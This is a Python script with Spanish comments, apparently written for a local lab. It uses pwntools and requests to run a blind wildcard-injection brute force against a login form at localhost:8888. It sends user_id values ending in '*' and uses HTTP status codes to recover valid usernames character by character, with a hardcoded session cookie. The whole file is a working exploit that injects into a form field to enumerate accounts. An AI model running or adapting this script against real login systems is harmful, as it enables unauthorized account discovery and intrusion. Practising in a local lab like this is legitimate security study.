#!/usr/bin/python3

# Importar la biblioteca pwntools para funcionalidades adicionales
from pwn import *
# Importar la biblioteca requests para realizar solicitudes HTTP
import requests
# Importar la biblioteca time para manejar pausas en el tiempo
import time
# Importar la biblioteca sys para interacción con el sistema
import sys
# Importar la biblioteca signal para manejar señales
import signal
# Importar la cadena de caracteres predefinida
import string

# Función para manejar la señal SIGINT (Ctrl+C)
def saliendo(sig, frame):
    print('\n\n[+] Saliendo...\n\n')
    sys.exit(1)

# Asignar la función de manejo de señal a SIGINT
signal.signal(signal.SIGINT, saliendo)

# URL de inicio de sesión
login_url = "http://localhost:8888/"
# Caracteres posibles para el usuario (incluye letras, números y caracteres especiales)
caracteres = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$()*+,-./:;<=>?^_`{|}~ "

# Crear un objeto de progreso para mostrar el estado de la fuerza bruta
p1 = log.progress("Fuerza bruta")
p1.status("Iniciando ...")

# Pausa de 2 segundos para permitir que se establezca la conexión
time.sleep(2)

# Crear un objeto de progreso para mostrar el estado del atributo
p2 = log.progress("Atributo")

# Función para generar las iniciales (primera letra del nombre de usuario)
def iniciales():
    atributo = ""
    usuarios = []

    # Iterar a través de cada caracter en la cadena de caracteres definida
    for caracter in caracteres:
        # Construir los datos de la solicitud POST con el caracter actual como usuario_id
        post_data = "user_id={}*&password=*&login=1&submit=SubmitS".format(caracter)
        p1.status(post_data)

        # Configuraciones de cookies y encabezados para la solicitud POST
        cookie = {"PHPSESSID": "2dbb04c8b8bd63de3f81992c51556f95"}
        header = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "http://localhost:8888",
            "Connection": "close",
            "Referer": "http://localhost:8888/",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1"
        }

        # Enviar una solicitud POST al servidor de inicio de sesión
        respuesta = requests.post(login_url, headers=header, cookies=cookie, data=post_data, allow_redirects=False)

        # Si el código de estado de la respuesta es mayor que 250, agregar el caracter a la lista de usuarios
        if respuesta.status_code > 250:
            usuarios.append(caracter)
            p2.status(usuarios)
    
    return usuarios  # Devolver la lista de usuarios

# Función para obtener usuarios válidos en función de las iniciales generadas
def get_users(initials):
    usuarios_validos = []

    # Iterar a través de cada inicial generada
    for initial in initials:
        usuario = ""

        # Iterar a través de 15 posiciones posibles para el nombre de usuario
        for posicion in range(0, 15):
            for caracter in caracteres:
                # Construir los datos de la solicitud POST con la inicial, usuario y caracter actual
                post_data = "user_id={}{}{}*&password=*&login=1&submit=SubmitS".format(initial, usuario, caracter)
                p1.status(post_data)

                # Configuraciones de cookies y encabezados para la solicitud POST
                cookie = {"PHPSESSID": "2dbb04c8b8bd63de3f81992c51556f95"}
                header = {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "http://localhost:8888",
                    "Connection": "close",
                    "Referer": "http://localhost:8888/",
                    "Upgrade-Insecure-Requests": "1",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-User": "?1"
                }

                # Enviar una solicitud POST al servidor de inicio de sesión
                respuesta = requests.post(login_url, headers=header, cookies=cookie, data=post_data, allow_redirects=False)

                # Si el código de estado de la respuesta es mayor que 250, agregar el caracter a la cadena de usuario y finalizar el bucle
                if respuesta.status_code > 250:
                    usuario += caracter
                    p2.status(initial + usuario)
                    break

        # Agregar la combinación válida de inicial y usuario a la lista de usuarios válidos
        usuarios_validos.append(initial + usuario)
        p2.status(usuarios_validos)
    
    return usuarios_validos  # Devolver la lista de usuarios válidos

# Función principal del programa
def main():
    # Generar la lista de iniciales
    initials_list = iniciales()
    # Obtener usuarios válidos basados en las iniciales generadas
    usuarios_validos = get_users(initials_list)
    # Mostrar el estado de los usuarios válidos
    p2.status(usuarios_validos)

# Ejecutar la función principal si el script se ejecuta directamente
if __name__ == "__main__":
    main()
